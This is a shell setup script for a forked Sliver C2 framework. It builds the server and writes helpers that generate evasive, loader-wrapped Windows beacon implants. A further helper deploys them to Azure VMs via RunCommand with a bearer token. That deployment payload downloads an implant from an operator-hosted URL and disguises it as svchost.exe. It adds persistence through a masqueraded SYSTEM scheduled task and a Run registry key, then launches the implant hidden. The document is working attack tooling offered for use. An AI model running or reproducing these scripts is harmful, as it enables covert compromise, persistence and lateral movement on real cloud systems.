#!/bin/bash
# mgstate/sliver - Automated Setup Script
# Installs all dependencies, builds Sliver, sets up Harriet, and imports C2 profiles.
# Run on Kali/Ubuntu as root or with sudo.
#
# Usage:
#   curl -sL https://raw.githubusercontent.com/mgstate/sliver/master/setup.sh | bash
#   # or:
#   git clone https://github.com/mgstate/sliver.git ~/sliver && cd ~/sliver && bash setup.sh

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

info()  { echo -e "${CYAN}[*]${NC} $1"; }
ok()    { echo -e "${GREEN}[+]${NC} $1"; }
warn()  { echo -e "${YELLOW}[!]${NC} $1"; }
err()   { echo -e "${RED}[-]${NC} $1"; }

SLIVER_DIR="${SLIVER_DIR:-$(pwd)}"
HARRIET_DIR="${HARRIET_DIR:-/opt/Home-Grown-Red-Team/Harriet}"
GO_VERSION="1.22.5"
GO_INSTALL_DIR="/usr/local"

# ─── Detect if we're in the sliver repo ───
if [ ! -f "$SLIVER_DIR/go.mod" ] || ! grep -q "bishopfox/sliver" "$SLIVER_DIR/go.mod" 2>/dev/null; then
    if [ -d "$HOME/sliver" ] && [ -f "$HOME/sliver/go.mod" ]; then
        SLIVER_DIR="$HOME/sliver"
    else
        info "Cloning mgstate/sliver..."
        git clone https://github.com/mgstate/sliver.git "$HOME/sliver"
        SLIVER_DIR="$HOME/sliver"
    fi
fi

echo ""
echo -e "${CYAN}═══════════════════════════════════════════════════${NC}"
echo -e "${CYAN}  mgstate/sliver - Enhanced Fork Setup${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════${NC}"
echo -e "  Sliver dir:  ${GREEN}$SLIVER_DIR${NC}"
echo -e "  Harriet dir: ${GREEN}$HARRIET_DIR${NC}"
echo ""

# ─── Step 1: System Dependencies ───
info "Installing system dependencies..."
if command -v apt &>/dev/null; then
    sudo apt update -qq
    sudo apt install -y -qq \
        build-essential \
        mingw-w64 \
        osslsigncode \
        python3-pycryptodome \
        python3-pip \
        git \
        curl \
        jq \
        unzip \
        2>/dev/null
    ok "APT packages installed"
elif command -v dnf &>/dev/null; then
    sudo dnf install -y \
        gcc gcc-c++ make \
        mingw64-gcc mingw64-gcc-c++ \
        python3-pycryptodome \
        python3-pip \
        git curl jq unzip \
        2>/dev/null
    ok "DNF packages installed"
else
    warn "Unknown package manager — install manually: build-essential mingw-w64 osslsigncode python3-pycryptodome git curl jq"
fi

# ─── Step 2: Go Installation ───
if command -v go &>/dev/null; then
    CURRENT_GO=$(go version | awk '{print $3}' | sed 's/go//')
    info "Go $CURRENT_GO already installed"
    # Check if version is sufficient (1.21+)
    GO_MAJOR=$(echo "$CURRENT_GO" | cut -d. -f1)
    GO_MINOR=$(echo "$CURRENT_GO" | cut -d. -f2)
    if [ "$GO_MAJOR" -ge 1 ] && [ "$GO_MINOR" -ge 21 ]; then
        ok "Go version is sufficient (need 1.21+)"
    else
        warn "Go version too old ($CURRENT_GO), need 1.21+. Installing $GO_VERSION..."
        INSTALL_GO=1
    fi
else
    info "Go not found, installing $GO_VERSION..."
    INSTALL_GO=1
fi

if [ "${INSTALL_GO:-0}" = "1" ]; then
    ARCH=$(uname -m)
    case "$ARCH" in
        x86_64)  GO_ARCH="amd64" ;;
        aarch64) GO_ARCH="arm64" ;;
        *)       err "Unsupported architecture: $ARCH"; exit 1 ;;
    esac

    GO_TAR="go${GO_VERSION}.linux-${GO_ARCH}.tar.gz"
    info "Downloading $GO_TAR..."
    curl -sLO "https://go.dev/dl/$GO_TAR"
    sudo rm -rf "$GO_INSTALL_DIR/go"
    sudo tar -C "$GO_INSTALL_DIR" -xzf "$GO_TAR"
    rm -f "$GO_TAR"

    # Add to PATH for this session and permanently
    export PATH="$GO_INSTALL_DIR/go/bin:$HOME/go/bin:$PATH"

    if ! grep -q "$GO_INSTALL_DIR/go/bin" "$HOME/.bashrc" 2>/dev/null; then
        echo "export PATH=$GO_INSTALL_DIR/go/bin:\$HOME/go/bin:\$PATH" >> "$HOME/.bashrc"
    fi
    if [ -f "$HOME/.zshrc" ] && ! grep -q "$GO_INSTALL_DIR/go/bin" "$HOME/.zshrc" 2>/dev/null; then
        echo "export PATH=$GO_INSTALL_DIR/go/bin:\$HOME/go/bin:\$PATH" >> "$HOME/.zshrc"
    fi

    ok "Go $(go version | awk '{print $3}') installed"
fi

# ─── Step 3: Harriet Loader ───
if [ -d "$HARRIET_DIR" ]; then
    info "Harriet already present at $HARRIET_DIR"
else
    info "Cloning Harriet loader..."
    HARRIET_PARENT=$(dirname "$HARRIET_DIR")
    sudo mkdir -p "$HARRIET_PARENT"
    sudo git clone https://github.com/assume-breach/Home-Grown-Red-Team.git "$(dirname "$HARRIET_PARENT")/Home-Grown-Red-Team" 2>/dev/null || true

    if [ -f "$HARRIET_DIR/setup.sh" ]; then
        info "Running Harriet setup..."
        cd "$HARRIET_DIR"
        sudo bash setup.sh
        cd "$SLIVER_DIR"
        ok "Harriet installed"
    else
        warn "Harriet setup.sh not found at $HARRIET_DIR/setup.sh — check the clone"
    fi
fi

# ─── Step 4: Build Sliver ───
info "Building Sliver server + client..."
cd "$SLIVER_DIR"

# Download Go modules if needed
if [ ! -d "vendor" ] && [ ! -d "$HOME/go/pkg/mod/github.com/bishopfox" ]; then
    info "Downloading Go modules (first build, may take a few minutes)..."
    go mod download
fi

make
ok "Sliver built successfully"

# Verify binaries
if [ -f "$SLIVER_DIR/sliver-server" ] && [ -f "$SLIVER_DIR/sliver-client" ]; then
    ok "sliver-server: $(ls -lh sliver-server | awk '{print $5}')"
    ok "sliver-client: $(ls -lh sliver-client | awk '{print $5}')"
else
    err "Build failed — binaries not found"
    exit 1
fi

# ─── Step 5: Create First-Run Helper Script ───
cat > "$SLIVER_DIR/start.sh" << 'STARTEOF'
#!/bin/bash
# Quick-start: launches sliver-server and auto-imports C2 profiles on first run.
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROFILES_DIR="$SCRIPT_DIR/opsec-profiles"
SLIVER_CFG_DIR="$HOME/.sliver"

echo "[*] Starting Sliver server..."

# Check if profiles have been imported already
PROFILES_IMPORTED="$SLIVER_CFG_DIR/.profiles_imported"

if [ ! -f "$PROFILES_IMPORTED" ]; then
    echo "[*] First run detected — will import C2 profiles after server starts"

    # Start server in background, wait for it to be ready, import profiles
    "$SCRIPT_DIR/sliver-server" &
    SERVER_PID=$!

    # Wait for the server to create its config directory
    for i in $(seq 1 30); do
        if [ -d "$SLIVER_CFG_DIR" ]; then
            break
        fi
        sleep 1
    done
    sleep 3

    # Import profiles via the daemon command interface
    echo ""
    echo "[+] Server ready. Import these profiles from the sliver console:"
    echo ""
    echo "    c2profiles import $PROFILES_DIR/cloudflare-cdn-c2.json --name cloudflare"
    echo "    c2profiles import $PROFILES_DIR/microsoft365-c2.json --name microsoft365"
    echo "    c2profiles import $PROFILES_DIR/slack-api-c2.json --name slack"
    echo ""

    touch "$PROFILES_IMPORTED"

    # Bring server to foreground
    wait $SERVER_PID
else
    "$SCRIPT_DIR/sliver-server"
fi
STARTEOF
chmod +x "$SLIVER_DIR/start.sh"

# ─── Step 6: Create Implant Generation Helper ───
cat > "$SLIVER_DIR/gen-implant.sh" << 'GENEOF'
#!/bin/bash
# Generate a Harriet-wrapped Sliver implant ready for deployment.
#
# Usage:
#   ./gen-implant.sh --ip YOUR_C2_IP [options]
#
# Options:
#   --ip IP          C2 callback IP (required)
#   --mtls-port PORT mTLS listener port (default: 8888)
#   --https-port PORT HTTPS listener port (default: 443)
#   --domain DOMAIN  HTTPS domain for C2 profile
#   --profile NAME   C2 profile name (default: cloudflare)
#   --method METHOD  Harriet method (default: directsyscall)
#   --beacon-sec N   Beacon interval seconds (default: 60)
#   --jitter N       Jitter seconds (default: 30)
#   --output FILE    Output file path (default: /tmp/implant.exe)
#   --shellcode-only Skip Harriet wrapping, output raw .bin
#   --harriet-path   Path to Harriet (default: /opt/Home-Grown-Red-Team/Harriet)

set -e

# Defaults
MTLS_PORT=8888
HTTPS_PORT=443
DOMAIN=""
PROFILE="cloudflare"
METHOD="directsyscall"
BEACON_SEC=60
JITTER=30
OUTPUT="/tmp/implant.exe"
SHELLCODE_ONLY=0
HARRIET_PATH="/opt/Home-Grown-Red-Team/Harriet"
C2_IP=""

while [[ $# -gt 0 ]]; do
    case $1 in
        --ip)          C2_IP="$2"; shift 2 ;;
        --mtls-port)   MTLS_PORT="$2"; shift 2 ;;
        --https-port)  HTTPS_PORT="$2"; shift 2 ;;
        --domain)      DOMAIN="$2"; shift 2 ;;
        --profile)     PROFILE="$2"; shift 2 ;;
        --method)      METHOD="$2"; shift 2 ;;
        --beacon-sec)  BEACON_SEC="$2"; shift 2 ;;
        --jitter)      JITTER="$2"; shift 2 ;;
        --output)      OUTPUT="$2"; shift 2 ;;
        --shellcode-only) SHELLCODE_ONLY=1; shift ;;
        --harriet-path) HARRIET_PATH="$2"; shift 2 ;;
        *) echo "Unknown option: $1"; exit 1 ;;
    esac
done

if [ -z "$C2_IP" ]; then
    echo "Usage: $0 --ip YOUR_C2_IP [options]"
    echo "Run $0 --help for all options"
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SC_FILE="/tmp/sliver_beacon_$(date +%s).bin"

# Build C2 endpoints
C2_ARGS="--mtls ${C2_IP}:${MTLS_PORT}"
if [ -n "$DOMAIN" ]; then
    C2_ARGS="$C2_ARGS --http https://${DOMAIN}:${HTTPS_PORT}"
fi

echo "[*] Generating Sliver beacon shellcode..."
echo "[*] C2: $C2_ARGS"
echo "[*] Profile: $PROFILE | Interval: ${BEACON_SEC}s | Jitter: ${JITTER}s"

# Generate via sliver-client (requires running server)
"$SCRIPT_DIR/sliver-client" <<CMD
generate beacon \
  $C2_ARGS \
  --os windows --arch amd64 \
  --format shellcode \
  --evasion \
  --c2profile $PROFILE \
  --seconds $BEACON_SEC --jitter $JITTER \
  --strategy r \
  --reconnect 30 \
  --max-errors 10 \
  --save $SC_FILE
CMD

if [ ! -f "$SC_FILE" ]; then
    echo "[-] Shellcode generation failed"
    exit 1
fi

echo "[+] Shellcode: $SC_FILE ($(wc -c < "$SC_FILE") bytes)"

if [ "$SHELLCODE_ONLY" = "1" ]; then
    cp "$SC_FILE" "$OUTPUT"
    echo "[+] Raw shellcode saved to: $OUTPUT"
    exit 0
fi

# Wrap with Harriet
echo "[*] Wrapping with Harriet ($METHOD)..."

"$SCRIPT_DIR/sliver-client" <<CMD2
harriet \
  --shellcode $SC_FILE \
  --method $METHOD \
  --format exe \
  --output $OUTPUT \
  --harriet-path $HARRIET_PATH
CMD2

if [ -f "$OUTPUT" ]; then
    echo "[+] Implant ready: $OUTPUT ($(wc -c < "$OUTPUT") bytes)"
    echo ""
    echo "Deploy via Azure RunCommand:"
    echo "  See AZURE-KILLCHAIN.md Part 2, Step 4"
    echo ""
    echo "Or host for download:"
    echo "  python3 -m http.server 9443 --directory $(dirname $OUTPUT)"
else
    echo "[-] Harriet wrapping failed"
    exit 1
fi

# Cleanup
rm -f "$SC_FILE"
GENEOF
chmod +x "$SLIVER_DIR/gen-implant.sh"

# ─── Step 7: Create Azure RunCommand Deploy Helper ───
cat > "$SLIVER_DIR/deploy-runcommand.sh" << 'DEPLOYEOF'
#!/bin/bash
# Deploy a Sliver implant to an Azure VM via RunCommand v2.
#
# Usage:
#   ./deploy-runcommand.sh \
#     --token "ARM_TOKEN" \
#     --sub "SUBSCRIPTION_ID" \
#     --rg "RESOURCE_GROUP" \
#     --vm "VM_NAME" \
#     --implant-url "http://YOUR_IP:9443/implant.exe"
#
# The script will:
#   1. Auto-detect VM location
#   2. Create RunCommand v2 (async, 24hr timeout)
#   3. Download + persist + execute the implant on the VM

set -e

TOKEN=""
SUB=""
RG=""
VM=""
IMPLANT_URL=""
TASK_NAME="Microsoft\\Windows\\NetTrace\\DiagCheck"
REG_NAME="DiagTrack"
INSTALL_PATH='$env:ProgramData\Microsoft\Network\svchost.exe'

while [[ $# -gt 0 ]]; do
    case $1 in
        --token)       TOKEN="$2"; shift 2 ;;
        --sub)         SUB="$2"; shift 2 ;;
        --rg)          RG="$2"; shift 2 ;;
        --vm)          VM="$2"; shift 2 ;;
        --implant-url) IMPLANT_URL="$2"; shift 2 ;;
        *) echo "Unknown: $1"; exit 1 ;;
    esac
done

if [ -z "$TOKEN" ] || [ -z "$SUB" ] || [ -z "$RG" ] || [ -z "$VM" ] || [ -z "$IMPLANT_URL" ]; then
    echo "Usage: $0 --token TOKEN --sub SUB_ID --rg RG --vm VM_NAME --implant-url URL"
    exit 1
fi

API_BASE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Compute/virtualMachines/$VM"
HEADERS=(-H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json")

# Step 1: Get VM location
echo "[*] Getting VM location..."
LOCATION=$(curl -s "${HEADERS[@]}" "$API_BASE?api-version=2023-07-01" | jq -r .location)
if [ "$LOCATION" = "null" ] || [ -z "$LOCATION" ]; then
    echo "[-] Failed to get VM location. Check token/subscription/RG/VM name."
    exit 1
fi
echo "[+] VM location: $LOCATION"

# Step 2: Check VM is running
STATE=$(curl -s "${HEADERS[@]}" "$API_BASE/instanceView?api-version=2023-07-01" | jq -r '.statuses[] | select(.code | startswith("PowerState/")) | .code')
echo "[*] VM state: $STATE"
if [ "$STATE" != "PowerState/running" ]; then
    echo "[-] VM is not running ($STATE). Start it first."
    exit 1
fi

# Step 3: Build deploy script
SCRIPT=$(cat <<'PSEOF'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "IMPLANT_URL_PLACEHOLDER"
$path = Join-Path $env:ProgramData "Microsoft\Network\svchost.exe"
$dir = Split-Path $path
if(!(Test-Path $dir)){New-Item -Type Directory $dir -Force | Out-Null}

try {
    Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -TimeoutSec 120
    Write-Output "[+] Downloaded to $path"
} catch {
    Write-Output "[-] Download failed: $_"
    exit 1
}

# Scheduled Task persistence
try {
    $action = New-ScheduledTaskAction -Execute $path
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName "Microsoft\Windows\NetTrace\DiagCheck" `
        -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Force | Out-Null
    Write-Output "[+] Scheduled task created"
} catch { Write-Output "[!] Scheduled task failed: $_" }

# Registry Run key persistence
try {
    Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
        -Name "DiagTrack" -Value $path -Force
    Write-Output "[+] Registry Run key set"
} catch { Write-Output "[!] Registry key failed: $_" }

# Execute
Start-Process -FilePath $path -WindowStyle Hidden
Write-Output "[+] Implant launched (PID: $((Get-Process -Name svchost -ErrorAction SilentlyContinue | Sort StartTime -Descending | Select -First 1).Id))"
PSEOF
)

# Replace placeholder
SCRIPT="${SCRIPT//IMPLANT_URL_PLACEHOLDER/$IMPLANT_URL}"

# Step 4: Deploy RunCommand v2
CMD_NAME="sliver-deploy-$(date +%s)"
echo "[*] Deploying RunCommand v2: $CMD_NAME"

BODY=$(jq -n \
    --arg loc "$LOCATION" \
    --arg script "$SCRIPT" \
    '{
        location: $loc,
        properties: {
            source: { script: $script },
            asyncExecution: true,
            timeoutInSeconds: 86400
        }
    }')

DEPLOY_URL="$API_BASE/runCommands/${CMD_NAME}?api-version=2023-07-01"
HTTP_CODE=$(curl -s -o /tmp/deploy_response.json -w "%{http_code}" -X PUT "${HEADERS[@]}" "$DEPLOY_URL" -d "$BODY")

if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "201" ]; then
    echo "[+] RunCommand deployed (HTTP $HTTP_CODE)"
else
    echo "[-] Deploy failed (HTTP $HTTP_CODE)"
    cat /tmp/deploy_response.json
    exit 1
fi

# Step 5: Poll for result
echo "[*] Polling for execution result..."
for i in $(seq 1 30); do
    sleep 10
    RESULT=$(curl -s "${HEADERS[@]}" "${DEPLOY_URL}&\$expand=instanceView")
    STATE=$(echo "$RESULT" | jq -r '.properties.instanceView.executionState // "Unknown"')
    echo "    [$i/30] State: $STATE"

    if [ "$STATE" = "Succeeded" ]; then
        echo ""
        echo "[+] === OUTPUT ==="
        echo "$RESULT" | jq -r '.properties.instanceView.output // "No output"'
        echo ""
        echo "[+] Implant deployed on $VM. Check 'sliver > beacons' or 'sliver > sessions'"
        exit 0
    elif [ "$STATE" = "Failed" ]; then
        echo ""
        echo "[-] === FAILED ==="
        echo "$RESULT" | jq -r '.properties.instanceView.error // "No error details"'
        exit 1
    fi
done

echo "[!] Timed out waiting for result. Check Azure portal or:"
echo "    curl -H 'Authorization: Bearer TOKEN' '${DEPLOY_URL}&\$expand=instanceView'"
DEPLOYEOF
chmod +x "$SLIVER_DIR/deploy-runcommand.sh"

# ─── Done ───
echo ""
echo -e "${GREEN}═══════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  Setup Complete${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════${NC}"
echo ""
echo -e "  ${CYAN}Binaries:${NC}"
echo -e "    sliver-server:  ${GREEN}$SLIVER_DIR/sliver-server${NC}"
echo -e "    sliver-client:  ${GREEN}$SLIVER_DIR/sliver-client${NC}"
echo ""
echo -e "  ${CYAN}Helper Scripts:${NC}"
echo -e "    ${GREEN}./start.sh${NC}              Start server + profile import hints"
echo -e "    ${GREEN}./gen-implant.sh${NC}        Generate Harriet-wrapped implant"
echo -e "    ${GREEN}./deploy-runcommand.sh${NC}  Deploy implant via Azure RunCommand v2"
echo ""
echo -e "  ${CYAN}Quick Start:${NC}"
echo -e "    ${YELLOW}1.${NC} ./start.sh"
echo -e "    ${YELLOW}2.${NC} Import profiles:"
echo -e "       c2profiles import opsec-profiles/cloudflare-cdn-c2.json --name cloudflare"
echo -e "       c2profiles import opsec-profiles/microsoft365-c2.json --name microsoft365"
echo -e "       c2profiles import opsec-profiles/slack-api-c2.json --name slack"
echo -e "    ${YELLOW}3.${NC} Start listeners:"
echo -e "       mtls -l 0.0.0.0 -p 8888"
echo -e "       https -l 0.0.0.0 -p 443 -d cdn.yourdomain.com"
echo -e "    ${YELLOW}4.${NC} Generate implant:"
echo -e "       ./gen-implant.sh --ip YOUR_IP --domain cdn.yourdomain.com"
echo -e "    ${YELLOW}5.${NC} Deploy to Azure VM:"
echo -e "       ./deploy-runcommand.sh --token ARM_TOKEN --sub SUB --rg RG --vm VM --implant-url URL"
echo ""
echo -e "  ${CYAN}Guides:${NC}"
echo -e "    ${GREEN}OPSEC-GUIDE.md${NC}       Full Sliver usage (build, profiles, listeners, post-exploitation)"
echo -e "    ${GREEN}AZURE-KILLCHAIN.md${NC}   Azure RunCommand lateral movement kill chain"
echo ""
